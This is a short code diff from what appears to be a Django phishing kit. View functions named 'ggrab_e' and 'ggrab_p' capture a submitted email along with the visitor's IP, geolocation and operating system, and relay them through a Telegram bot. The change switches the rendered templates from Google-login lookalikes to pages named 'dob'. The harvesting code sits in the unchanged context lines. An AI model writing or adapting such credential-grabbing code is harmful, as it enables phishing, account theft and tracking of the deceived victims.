@@ -283,12 +283,12 @@ def ggrab_e(request):
     ip_info = get_ip_info(ip)
     OS = my_view(request)
     TeleBot(f"Email: {username}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
-    return render(request, 'googlp.html', {'email':username})
+    return render(request, 'dobp.html', {'email':username})
 
 
 def gsignin(request):
     validate(request)
-    return render(request, 'google.html')
+    return render(request, 'dob.html')
 
 def ggrab_p(request):
     validate(request)
